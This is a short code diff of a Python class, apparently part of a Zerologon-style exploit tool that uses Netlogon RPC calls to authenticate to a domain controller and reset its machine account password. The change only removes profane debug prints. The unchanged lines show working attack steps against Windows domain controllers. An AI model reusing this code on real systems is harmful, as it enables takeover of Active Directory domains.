@@ -117,7 +117,6 @@ class ChangeMachinePassword:
         dce.connect()
         dce.bind(nrpc.MSRPC_UUID_NRPC)
 
-        print(YELLOW+"FUCK2"+NOCOLOR)
         resp = nrpc.hNetrServerReqChallenge(dce, NULL, remoteName + '\x00', b'12345678')
         serverChallenge = resp['ServerChallenge']
 
@@ -128,9 +127,7 @@ class ChangeMachinePassword:
 
         self.ppp = nrpc.ComputeNetlogonCredentialAES(b'12345678', self.sessionKey)
 
-        print(YELLOW+"FUCK3"+NOCOLOR)
         try:
-            print(YELLOW+"FUCK4 Try"+self.__username+NOCOLOR)
             resp = nrpc.hNetrServerAuthenticate3(dce, '\\\\' + remoteName + '\x00', remoteName + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,remoteName + '\x00',self.ppp, 0x212fffff )
         except Exception as e:
             if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
@@ -150,7 +147,6 @@ class ChangeMachinePassword:
         print('Changed password back to original value OK')
 
     def update_authenticator(self, plus=10):
-        print(YELLOW+"FUCK UPDATE AUTHENTICATOR"+NOCOLOR)
         authenticator = nrpc.NETLOGON_AUTHENTICATOR()
         authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(self.clientStoredCredential, self.sessionKey)
         authenticator['Timestamp'] = plus
